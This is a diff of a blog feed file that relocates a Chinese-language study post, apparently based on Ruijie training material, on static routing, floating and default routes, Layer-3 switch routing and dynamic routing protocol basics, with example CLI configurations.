-SW1(config)#ip route 192.168.4.0 255.255.255.0 10.0.0.2 </code></pre>
-
-<pre class="language-none"><code class="language-none">SW2(config)#vlan 800
-SW2(config)#interface vlan 30
-SW2(config-if)#ip address 192.168.3.254 255.255.255.0 
-SW2(config)#interface vlan 40
-SW2(config-if)#ip address 192.168.4.254 255.255.255.0 
-SW2(config)#interface vlan 800
-SW2(config-if)#ip address 10.0.0.2 255.255.255.252
-SW2(config)#ip route 192.168.1.0 255.255.255.0 10.0.0.1
-SW2(config)#ip route 192.168.2.0 255.255.255.0 10.0.0.1</code></pre>
-
-<ul>
-<li>SW1、SW2的SVI与静态路由配置 <ul>
-<li>通过给VLAN10、20、30、40、800配置IP地址并no shutdown，使交换机具有多个虚拟的路由口 </li>
-<li>VLAN10、20、30、40的SVI地址可以分别作为相应VLAN内PC机的默认网关</li>
-<li>（方案2）SW1与SW2的G0&#x2F;5接口可以转化为三层路由接口，作为互联地址 </li>
-<li>通过配置静态路由，使不同VLAN、不同IP网络间的PC机能互相通信</li>
-</ul>
-</li>
-</ul>
-<pre class="language-none"><code class="language-none">SW1(config)#interface vlan 10
-SW1(config-if)#ip address 192.168.1.254 255.255.255.0
-SW1(config)#interface vlan 20
-SW1(config-if)#ip address 192.168.2.254 255.255.255.0 
-SW1(config)#interface GigabitEthernet 0&#x2F;5
-SW1(config-if)#no switchport
-SW1(config-if)# ip address 10.0.0.1 255.255.255.252
-SW1(config)#ip route 192.168.3.0 255.255.255.0 10.0.0.2
-SW1(config)#ip route 192.168.4.0 255.255.255.0 10.0.0.2 </code></pre>
-
-<pre class="language-none"><code class="language-none">SW2(config)#interface vlan 30
-SW2(config-if)#ip address 192.168.3.254 255.255.255.0 
-SW2(config)#interface vlan 40
-SW2(config-if)#ip address 192.168.4.254 255.255.255.0 
-SW2(config)#interface GigabitEthernet 0&#x2F;5
-SW2(config-if)#no switchport
-SW2(config-if)# ip address 10.0.0.2 255.255.255.252
-SW2(config)#ip route 192.168.1.0 255.255.255.0 10.0.0.1
-SW2(config)#ip route 192.168.2.0 255.255.255.0 10.0.0.1</code></pre>
-
-<h3 id="静态路由配置案例4-——-三层交换机上配置静态路由-1"><a href="#静态路由配置案例4-——-三层交换机上配置静态路由-1" class="headerlink" title="静态路由配置案例4 —— 三层交换机上配置静态路由"></a>静态路由配置案例4 —— 三层交换机上配置静态路由</h3><ul>
-<li>SW1、SW2的SVI与静态路由配置 <ul>
-<li>通过给VLAN10、20、30、40、800配置IP地址并no shutdown，使交换机具有多个虚拟的路由口 </li>
-<li>VLAN10、20、30、40的SVI地址可以分别作为相应VLAN内PC机的默认网关 </li>
-<li>（方案2）SW1与SW2的G0&#x2F;5接口可以转化为三层路由接口，作为互联地址 </li>
-<li>通过配置静态路由，使不同VLAN、不同IP网络间的PC机能互相通信</li>
-</ul>
-</li>
-</ul>
-<pre class="language-none"><code class="language-none">SW1(config)#interface vlan 10
-SW1(config-if)#ip address 192.168.1.254 255.255.255.0
-SW1(config)#interface vlan 20
-SW1(config-if)#ip address 192.168.2.254 255.255.255.0 
-SW1(config)#interface GigabitEthernet 0&#x2F;5
-SW1(config-if)#no switchport
-SW1(config-if)# ip address 10.0.0.1 255.255.255.252
-SW1(config)#ip route 192.168.3.0 255.255.255.0 10.0.0.2
-SW1(config)#ip route 192.168.4.0 255.255.255.0 10.0.0.2 </code></pre>
-
-<pre class="language-none"><code class="language-none">SW2(config)#interface vlan 30
-SW2(config-if)#ip address 192.168.3.254 255.255.255.0 
-SW2(config)#interface vlan 40
-SW2(config-if)#ip address 192.168.4.254 255.255.255.0 
-SW2(config)#interface GigabitEthernet 0&#x2F;5
-SW2(config-if)#no switchport
-SW2(config-if)# ip address 10.0.0.2 255.255.255.252
-SW2(config)#ip route 192.168.1.0 255.255.255.0 10.0.0.1
-SW2(config)#ip route 192.168.2.0 255.255.255.0 10.0.0.1</code></pre>
-
-<h3 id="静态路由配置案例5-——-汇总路由"><a href="#静态路由配置案例5-——-汇总路由" class="headerlink" title="静态路由配置案例5 —— 汇总路由"></a>静态路由配置案例5 —— 汇总路由</h3><ul>
-<li>路由汇总的定义：把多条路由条目汇总成一条路由条目。</li>
-<li>路由汇总的作用：收缩路由表，减轻路由器的负担，提高路由器的转发效率 </li>
-<li>分别在R1和R2上仅配置一条静态路由（不能使用默认路由），使所有PC能互相通信</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104258.png" alt="20" loading="lazy"></p>
-<ul>
-<li>配置R1路由器</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104303.png" alt="21" loading="lazy"></p>
-<h4 id="静态路由配置案例5-——-路由汇总的限制"><a href="#静态路由配置案例5-——-路由汇总的限制" class="headerlink" title="静态路由配置案例5 —— 路由汇总的限制"></a>静态路由配置案例5 —— 路由汇总的限制</h4><ul>
-<li>在特定场景下，才可实施路由汇总</li>
-<li>在以下的场景中，在R2上不能做路由汇总</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104308.png" alt="22" loading="lazy"></p>
-<h2 id="动态路由"><a href="#动态路由" class="headerlink" title="动态路由"></a>动态路由</h2><h3 id="动态路由协议"><a href="#动态路由协议" class="headerlink" title="动态路由协议"></a>动态路由协议</h3><ul>
-<li>目前网络项目中的主流路由协议有：RIP、OSPF、BGP</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104312.png" alt="23" loading="lazy"></p>
-<ul>
-<li>这是路由器用来计算、维护网络路由信息的协议，通常有一定的算法，工作在传输层或应用层 <ul>
-<li>RIP基于UDP，端口号520 </li>
-<li>OSPF基于IP，协议号89 </li>
-<li>BGP基于TCP，端口号179</li>
-</ul>
-</li>
-<li>路由协议工作机制的四个主要步骤： <ul>
-<li>邻居发现：路由器通过发送广播或组播报文的方式发现网络中的邻居，并基于特定参数来建立邻居关系。 </li>
-<li>路由交换：每台路由器将自己已知的路由相关信息发给相邻路由器。 </li>
-<li>路由计算：每台路由器运行某种算法，计算出最终的路由表。</li>
-<li>路由维护：路由器之间通过周期性地发送协议报文来维护邻居信息。</li>
-</ul>
-</li>
-</ul>
-<h3 id="动态路由基本概念"><a href="#动态路由基本概念" class="headerlink" title="动态路由基本概念"></a>动态路由基本概念</h3><ul>
-<li>衡量路由协议的主要指标 <ul>
-<li>协议计算的正确性：协议使用的算法能够计算出最优的路由，且正确无自环。 </li>
-<li>路由收敛速度：当网络的拓扑结构发生变化之后，能够迅速感知并及时更新相应的路由信息。 </li>
-<li>协议占用系统开销：协议自身占用的资源开销（内存、CPU、网络带宽)。</li>
-<li>协议自身的安全性：协议自身不易受攻击，有安全机制。 </li>
-<li>协议适用网络规模：协议可以应用在何种拓扑结构和规模的网络中。</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104316.png" alt="24" loading="lazy"></p>
-<h3 id="动态路由协议的分类"><a href="#动态路由协议的分类" class="headerlink" title="动态路由协议的分类"></a>动态路由协议的分类</h3><ul>
-<li>按照管理范围分类 <ul>
-<li>IGP（内部网关协议）：RIP、EIGRP、OSPF、IS-IS（园区网常用协议） </li>
-<li>EGP（外部网关协议）：BGP（主要应用在金融，政府电子政务网，运营商网络）</li>
-</ul>
-</li>
-<li>按照算法分类 <ul>
-<li>距离矢量路由协议：RIP、BGP </li>
-<li>链路状态路由协议：OSPF、IS-IS</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104320.png" alt="25" loading="lazy"></p>
-<h3 id="距离矢量路由协议"><a href="#距离矢量路由协议" class="headerlink" title="距离矢量路由协议"></a>距离矢量路由协议</h3><ul>
-<li>路由以矢量（距离、方向）的方式通告出去</li>
-<li>距离矢量协议直接传送各自的路由表信息 <ul>
-<li>每台路由器从邻居路由器直接获取路由信息，并将这些路由信息连同自己的本地路由信息发送给其他邻居</li>
-<li>如此逐跳传递，达到全网同步。每个路由器都不了解整个网络拓扑 </li>
-<li>它们只知道与自己直接相连的网络情况，并根据从邻居得到的路由信息更新自己的路由</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104350.png" alt="26" loading="lazy"></p>
-<h3 id="链路状态路由协议"><a href="#链路状态路由协议" class="headerlink" title="链路状态路由协议"></a>链路状态路由协议</h3><ul>
-<li>基于Dijkstra（迪克斯特拉）算法的最短路径优先（SPF）算法，比距离矢量路由协议复杂 </li>
-<li>路由器并不向邻居直接传递“路由表项”，而是通告给邻居链路状态 </li>
-<li>链路状态信息包括：接口IP地址和掩码、网络类型、链路开销、链路上所有相邻路由器</li>
-<li>运行该路由协议的路由器不是简单地从相邻的路由器学习路由，而是把路由器分成区域，收集区域的所有 的路由器的链路状态信息，根据状态信息和SPF算法生成网络拓扑结构，每一个路由器再根据拓扑结构计 算出路由</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104354.png" alt="27" loading="lazy"></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>锐捷</category>
-      </categories>
-      <tags>
-        <tag>锐捷</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>胖瘦AP组网方案</title>
     <url>/posts/82dddbd2/</url>
     <content><![CDATA[<div class="danger">
@@ -9426,6 +9210,390 @@ dc0c.5cd6.60b3 10.0.0.2 0074.9c5a.f76c&#x2F;2 10 10 192.0M&#x2F;D&#x2F;ac WPA2_P
 <li>集中转发：数据流通过AC，并且由AC解封装CAPWAP协议； </li>
 <li>本地转发：数据流不通过AC，没有CAPWAP数据隧道；</li>
 </ul>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>锐捷</category>
+      </categories>
+      <tags>
+        <tag>锐捷</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>路由技术介绍</title>
+    <url>/posts/f2727247/</url>
+    <content><![CDATA[<div class="danger">
+
+<blockquote>
+<p> 资料来源<a href="https://talent.ruijie.com.cn/certification/profession/">锐捷</a><br> 非原创</p>
+</blockquote>
+</div>
+
+<h2 id="路由技术介绍"><a href="#路由技术介绍" class="headerlink" title="路由技术介绍"></a>路由技术介绍</h2><h3 id="为什么需要路由"><a href="#为什么需要路由" class="headerlink" title="为什么需要路由"></a>为什么需要路由</h3><ul>
+<li>PC的网卡在进行发送数据的时候，网络层将检查目的IP与本网卡的IP地址是否处于一个网段<ul>
+<li>如果属于一个网段，则直接用ARP解析目的IP的MAC地址 </li>
+<li>如果不属于一个网段，则用ARP解析网关的MAC地址</li>
+</ul>
+</li>
+<li>二层交换网络（同一广播域&#x2F;VLAN）内，不同网段的主机之间无法直接通信</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104121.png" alt="1" loading="lazy"></p>
+<h3 id="路由的定义"><a href="#路由的定义" class="headerlink" title="路由的定义"></a>路由的定义</h3><ul>
+<li>从一个接口上收到数据包，根据数据包的目的地址进行定向和转发的过程 </li>
+<li>路由器依据路由表选择下一跳地址&#x2F;出接口并转发数据，实现跨IP网段通信</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104128.png" alt="2" loading="lazy"></p>
+<h4 id="直接路由数据通信分析"><a href="#直接路由数据通信分析" class="headerlink" title="直接路由数据通信分析"></a>直接路由数据通信分析</h4><ul>
+<li>直接路由：同一个IP网络内的通信 </li>
+<li>回想一下：同一个LAN中的PC1和PC2之间的通信过程：PC1&gt;ping 192.168.1.200</li>
+</ul>
+<ol>
+<li>PC1封装一个负载为ICMP Echo的IP报文：源IP&#x3D;192.168.1.100 目的IP&#x3D;192.168.1.200 </li>
+<li>PC1将IP报文封装到以太网帧中，源MAC为本地网卡的MAC，需要确定目的地的MAC </li>
+<li>PC1先判断目标IP是否处于本地子网，结果发现“是” 方式：本地IP与本地掩码是否等于目标IP与本地掩码，如果结果相等，则说明目标IP处于本地子网 </li>
+<li>查本地ARP缓存是否存在目标IP（PC2）对 应的MAC，如果不存在，则通过ARP获取</li>
+<li>成功封装以太网帧，源MAC为PC1的MAC， 目标MAC为PC2的MAC，从PC1网卡发出</li>
+<li>交换机根据MAC地址表转发以太网帧。</li>
+<li>PC2收到以太网帧，解封装出ICMP Echo 需要回复ICMP Reply的IP报文 源IP&#x3D;192.168.1.200 目的IP&#x3D;192.168.1.100</li>
+<li>PC2重复②-⑤的处理流程</li>
+</ol>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104133.png" alt="3" loading="lazy"></p>
+<h3 id="间接路由数据通信分析"><a href="#间接路由数据通信分析" class="headerlink" title="间接路由数据通信分析"></a>间接路由数据通信分析</h3><ul>
+<li>间接路由：不同IP网络内的通信 </li>
+<li>再思考一下：如果PC2与其他LAN中的PC3通信，又该如何：PC2&gt;ping 192.168.2.100</li>
+</ul>
+<p>1、PC2封装一个负载为ICMP Echo的IP报文：源IP&#x3D;192.168.1.200 目的IP&#x3D;192.168.2.100</p>
+<p>2、将IP报文封装到以太网帧中，源MAC为本地网卡的MAC，需要确定目的地的MAC</p>
+<p>3、PC2先判断目标IP是否处于本地子网，结果发现“不是” </p>
+<p>4、PC2如果配置了默认网关，查本地ARP缓存是 否存在网关IP对应的MAC，如果不存在，则通过 ARP获取ARP表项</p>
+<p>5、成功封装以太网帧，源MAC为PC2的MAC， 目标MAC为网关的MAC。由网卡接口发出</p>
+<p>6、交换机根据MAC地址表转发以太网帧，将会发送给网关</p>
+<p>7、网关路由器收到以太网帧，解封装出IP报文。根据报文中的目 标IP信息寻找出接口，在出接口重新封装以太网帧，再发出</p>
+<p>8、PC3收到以太网帧，解封装出ICMP Echo，需要回复ICMP  Reply，源IP&#x3D;192.168.2.100 目的IP&#x3D;192.168.1.200</p>
+<p>8、PC3收到以太网帧，解封装出ICMP Echo，需要回复ICMP  Reply，源IP&#x3D;192.168.2.100 目的IP&#x3D;192.168.1.200</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104140.png" alt="4" loading="lazy"></p>
+<h3 id="认识路由设备"><a href="#认识路由设备" class="headerlink" title="认识路由设备"></a>认识路由设备</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104144.png" alt="5" loading="lazy"></p>
+<h3 id="路由的下一跳"><a href="#路由的下一跳" class="headerlink" title="路由的下一跳"></a>路由的下一跳</h3><ul>
+<li>路由设备进行路由转发，下一台设备的端口IP地址 </li>
+<li>下一跳地址由路由表决定，PC客户端的默认下一跳地址通常称为“网关” <ul>
+<li>如图，PC2想要与PC3通信</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104149.png" alt="6" loading="lazy"></p>
+<ul>
+<li>下一跳地址是路由设备根据路由表选择的最佳路径 <ul>
+<li>如图，PC2想要与PC3通信</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104153.png" alt="7" loading="lazy"></p>
+<h3 id="路由表的构成与维护"><a href="#路由表的构成与维护" class="headerlink" title="路由表的构成与维护"></a>路由表的构成与维护</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104158.png" alt="8" loading="lazy"></p>
+<h3 id="路由表的构成"><a href="#路由表的构成" class="headerlink" title="路由表的构成"></a>路由表的构成</h3><p>路由表是路由器转发数据报文的判断依据。</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104202.png" alt="9" loading="lazy"></p>
+<h4 id="路由表的度量值"><a href="#路由表的度量值" class="headerlink" title="路由表的度量值"></a>路由表的度量值</h4><ul>
+<li>度量值（Metric）：路由协议用来衡量路径优劣的参数。表示到达目的地的代价总和</li>
+<li>影响度量值的因素：线路带宽、跳数、线路延迟·、线路使用率、线路可信度等</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104207.png" alt="10" loading="lazy"></p>
+<h3 id="路由表的内容"><a href="#路由表的内容" class="headerlink" title="路由表的内容"></a>路由表的内容</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104210.png" alt="11" loading="lazy"></p>
+<h3 id="管理距离"><a href="#管理距离" class="headerlink" title="管理距离"></a>管理距离</h3><ul>
+<li>管理距离（Administrative Distance），也叫优先级，用来衡量路由源的可信度 </li>
+<li>管理距离值越低，可信度越高。只有可信度最高的路由会被添加进路由表</li>
+<li>管理距离默认值由厂商自定义</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104214.png" alt="12" loading="lazy"></p>
+<h3 id="路由加表原则"><a href="#路由加表原则" class="headerlink" title="路由加表原则"></a>路由加表原则</h3><p>只有最佳路径才会被添加进路由表中，形成路由条目</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104217.png" alt="13" loading="lazy"></p>
+<h3 id="路由选路原则-——-最长子网掩码匹配原则"><a href="#路由选路原则-——-最长子网掩码匹配原则" class="headerlink" title="路由选路原则 —— 最长子网掩码匹配原则"></a>路由选路原则 —— 最长子网掩码匹配原则</h3><ul>
+<li><p>路由设备基于数据包的目的IP地址，按照最长子网掩码匹配原则查找路由表 </p>
+</li>
+<li><p>根据查询结果转发。查询无果则丢弃数据包</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104223.png" alt="14" loading="lazy"></p>
+</li>
+</ul>
+<h2 id="静态路由"><a href="#静态路由" class="headerlink" title="静态路由"></a>静态路由</h2><h3 id="静态路由-1"><a href="#静态路由-1" class="headerlink" title="静态路由"></a>静态路由</h3><ul>
+<li>由网络管理员手工配置的路由信息，当网络拓扑发生变化时，管理员需要手工修改静态路由信息 </li>
+<li>静态路由信息是本地有效的，不会传递给其他的路由器 </li>
+<li>静态路由一般适用于比较简单的网络环境，大型和复杂的网络环境通常不宜采用静态路由 使用静态路由好处是网络安全保密性高 </li>
+<li>使用全局配置命令ip route，配置静态路由 <ul>
+<li>下一跳地址必须是直连网络上可达的地址 </li>
+<li>点对点连接时，下一跳地址可用出接口代替</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104229.png" alt="15" loading="lazy"></p>
+<h3 id="静态路由配置案例1-——-基础配置"><a href="#静态路由配置案例1-——-基础配置" class="headerlink" title="静态路由配置案例1 —— 基础配置"></a>静态路由配置案例1 —— 基础配置</h3><ul>
+<li>在3台路由器上配置静态路由，使Net 1与Net 2能互相通信 <ul>
+<li>选择100M链路，路径为：Net1-R1-R2-R3-Net2</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">R1(config)#ip route 192.168.2.0 255.255.255.0 172.16.1.2
+R2(config)#ip route 192.168.1.0 255.255.255.0 172.16.1.1
+R2(config)#ip route 192.168.2.0 255.255.255.0 172.16.1.6
+R3(config)#ip route 192.168.1.0 255.255.255.0 172.16.1.5</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104233.png" alt="16" loading="lazy"></p>
+<h3 id="静态路由配置案例1-——-查看静态路由"><a href="#静态路由配置案例1-——-查看静态路由" class="headerlink" title="静态路由配置案例1 —— 查看静态路由"></a>静态路由配置案例1 —— 查看静态路由</h3><ul>
+<li>在特权用户模式显示IP路由表<ul>
+<li>ruijie#show ip route</li>
+</ul>
+</li>
+<li>查看R1、R2和R3的路由表</li>
+</ul>
+<pre class="language-none"><code class="language-none">R1#show ip route
+C 192.168.1.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
+C 172.16.1.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;2
+C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1 
+S 192.168.2.0&#x2F;24 [1&#x2F;0] via 172.16.1.2</code></pre>
+
+<pre class="language-none"><code class="language-none">R2#show ip route
+C 172.16.1.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;2 
+C 172.16.1.4&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;0
+S 192.168.1.0&#x2F;24 [1&#x2F;0] via 172.16.1.1
+S 192.168.2.0&#x2F;24 [1&#x2F;0] via 172.16.1.6</code></pre>
+
+<pre class="language-none"><code class="language-none">R3#show ip route
+C 172.16.1.4&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;0
+C 192.168.2.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
+C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
+S 192.168.1.0&#x2F;24 [1&#x2F;0] via 172.16.1.5</code></pre>
+
+
+
+<h3 id="静态路由配置案例2-——-默认路由"><a href="#静态路由配置案例2-——-默认路由" class="headerlink" title="静态路由配置案例2 —— 默认路由"></a>静态路由配置案例2 —— 默认路由</h3><ul>
+<li>默认静态路由是特殊的静态路由，它的目标网络和子网掩码均为0.0.0.0（默认路由有可能是动态路由）</li>
+<li>在R1和R3上配置默认路由，使R1与R3的100M链路故障时，可以使用10M链路</li>
+</ul>
+<pre class="language-none"><code class="language-none">R1(config)#ip route 0.0.0.0 0.0.0.0 172.16.1.10
+R3(config)#ip route 0.0.0.0 0.0.0.0 172.16.1.9</code></pre>
+
+<pre class="language-none"><code class="language-none">R1#show ip route
+C 192.168.1.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5 
+C 172.16.1.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;2
+C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
+S* 0.0.0.0&#x2F;0 [1&#x2F;0] via 172.16.1.10</code></pre>
+
+<pre class="language-none"><code class="language-none">R3#show ip route
+C 172.16.1.4&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;0
+C 192.168.2.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
+C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1 
+S* 0.0.0.0&#x2F;0 [1&#x2F;0] via 172.16.1.9</code></pre>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104239.png" alt="17" loading="lazy"></p>
+<h3 id="静态路由配置案例3-——-浮动静态路由"><a href="#静态路由配置案例3-——-浮动静态路由" class="headerlink" title="静态路由配置案例3 —— 浮动静态路由"></a>静态路由配置案例3 —— 浮动静态路由</h3><ul>
+<li>浮动路由就是在静态路由的基础上，加上管理距离参数，管理距离越小，可信度越高 </li>
+<li>配置了多条浮动路由，只有可信度最高（管理距离最小）的一条浮动路由会被添加到路由表中</li>
+<li>当可信度最高的浮动路由失效后，可信度次高的浮动会被添加到路由表中</li>
+<li>在R1和R3上配置浮动路由，使得正常状态路径为：Net1-R1-R2-R3-Net2 </li>
+<li>断开R1与R2、R3与R2的连接后，路径切换为：Net1-R1-R3-Net2</li>
+</ul>
+<pre class="language-none"><code class="language-none">R1(config)#ip route 192.168.2.0 255.255.255.0 172.16.1.2 10
+R1(config)#ip route 192.168.2.0 255.255.255.0 172.16.1.10 100
+R3(config)#ip route 192.168.1.0 255.255.255.0 172.16.1.5 10
+R3(config)#ip route 192.168.1.0 255.255.255.0 172.16.1.9 100</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104243.png" alt="18" loading="lazy"></p>
+<h3 id="静态路由配置案例3-——-查看浮动静态路由"><a href="#静态路由配置案例3-——-查看浮动静态路由" class="headerlink" title="静态路由配置案例3 —— 查看浮动静态路由"></a>静态路由配置案例3 —— 查看浮动静态路由</h3><ul>
+<li>配置完成后查看R1和R3的路由表</li>
+</ul>
+<pre class="language-none"><code class="language-none">R1#show ip route
+C 192.168.1.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
+C 172.16.1.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;2 
+C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
+S 192.168.2.0 &#x2F;24 [10&#x2F;0] via 172.16.1.2 </code></pre>
+
+<pre class="language-none"><code class="language-none">R3#show ip route
+C 172.16.1.4&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;0
+C 192.168.2.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5 
+C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
+S 192.168.1.0 &#x2F;24 [10&#x2F;0] via 172.16.1.5 </code></pre>
+
+<ul>
+<li>断开R1与R2、R3与R2的连接后，查看R1和R3的路由表</li>
+</ul>
+<pre class="language-none"><code class="language-none">R1#show ip route
+C 192.168.1.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
+C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
+S 192.168.2.0 &#x2F;24 [100&#x2F;0] via 172.16.1.10 </code></pre>
+
+<pre class="language-none"><code class="language-none">R3#show ip route
+C 192.168.2.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
+C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
+S 192.168.1.0 &#x2F;24 [100&#x2F;0] via 172.16.1.9</code></pre>
+
+<h3 id="静态路由配置案例4-——-三层交换机上配置静态路由"><a href="#静态路由配置案例4-——-三层交换机上配置静态路由" class="headerlink" title="静态路由配置案例4 —— 三层交换机上配置静态路由"></a>静态路由配置案例4 —— 三层交换机上配置静态路由</h3><ul>
+<li>三层交换机也有路由功能，可实现不同VLAN间通信 </li>
+<li>在两个三层交换机上的SVI(switch virtual interface)口配置IP作为三层接口</li>
+<li>三层交换机之间的互联：（方案1）可以选择用trunk （方案2）也可以选择用三层路由接口</li>
+<li>在两台三层交换机上配置静态路由</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104249.png" alt="19" loading="lazy"></p>
+<ul>
+<li>SW1、SW2的SVI与静态路由配置 <ul>
+<li>通过给VLAN10、20、30、40、800配置IP地址并no shutdown，使交换机具有多个虚拟的路由口</li>
+<li>VLAN10、20、30、40的SVI地址可以分别作为相应VLAN内PC机的默认网关 </li>
+<li>（方案1）VLAN 800的SVI地址可以作为SW1与SW2直连通信的路由地址 </li>
+<li>通过配置静态路由，使不同VLAN、不同IP网络间的PC机能互相通信</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">SW1(config)#vlan 800
+SW1(config)#interface vlan 10
+SW1(config-if)#ip address 192.168.1.254 255.255.255.0
+SW1(config)#interface vlan 20
+SW1(config-if)#ip address 192.168.2.254 255.255.255.0 
+SW1(config)#interface vlan 800
+SW1(config-if)#ip address 10.0.0.1 255.255.255.252
+SW1(config)#ip route 192.168.3.0 255.255.255.0 10.0.0.2
+SW1(config)#ip route 192.168.4.0 255.255.255.0 10.0.0.2 </code></pre>
+
+<pre class="language-none"><code class="language-none">SW2(config)#vlan 800
+SW2(config)#interface vlan 30
+SW2(config-if)#ip address 192.168.3.254 255.255.255.0 
+SW2(config)#interface vlan 40
+SW2(config-if)#ip address 192.168.4.254 255.255.255.0 
+SW2(config)#interface vlan 800
+SW2(config-if)#ip address 10.0.0.2 255.255.255.252
+SW2(config)#ip route 192.168.1.0 255.255.255.0 10.0.0.1
+SW2(config)#ip route 192.168.2.0 255.255.255.0 10.0.0.1</code></pre>
+
+<ul>
+<li>SW1、SW2的SVI与静态路由配置 <ul>
+<li>通过给VLAN10、20、30、40、800配置IP地址并no shutdown，使交换机具有多个虚拟的路由口 </li>
+<li>VLAN10、20、30、40的SVI地址可以分别作为相应VLAN内PC机的默认网关</li>
+<li>（方案2）SW1与SW2的G0&#x2F;5接口可以转化为三层路由接口，作为互联地址 </li>
+<li>通过配置静态路由，使不同VLAN、不同IP网络间的PC机能互相通信</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">SW1(config)#interface vlan 10
+SW1(config-if)#ip address 192.168.1.254 255.255.255.0
+SW1(config)#interface vlan 20
+SW1(config-if)#ip address 192.168.2.254 255.255.255.0 
+SW1(config)#interface GigabitEthernet 0&#x2F;5
+SW1(config-if)#no switchport
+SW1(config-if)# ip address 10.0.0.1 255.255.255.252
+SW1(config)#ip route 192.168.3.0 255.255.255.0 10.0.0.2
+SW1(config)#ip route 192.168.4.0 255.255.255.0 10.0.0.2 </code></pre>
+
+<pre class="language-none"><code class="language-none">SW2(config)#interface vlan 30
+SW2(config-if)#ip address 192.168.3.254 255.255.255.0 
+SW2(config)#interface vlan 40
+SW2(config-if)#ip address 192.168.4.254 255.255.255.0 
+SW2(config)#interface GigabitEthernet 0&#x2F;5
+SW2(config-if)#no switchport
+SW2(config-if)# ip address 10.0.0.2 255.255.255.252
+SW2(config)#ip route 192.168.1.0 255.255.255.0 10.0.0.1
+SW2(config)#ip route 192.168.2.0 255.255.255.0 10.0.0.1</code></pre>
+
+<h3 id="静态路由配置案例4-——-三层交换机上配置静态路由-1"><a href="#静态路由配置案例4-——-三层交换机上配置静态路由-1" class="headerlink" title="静态路由配置案例4 —— 三层交换机上配置静态路由"></a>静态路由配置案例4 —— 三层交换机上配置静态路由</h3><ul>
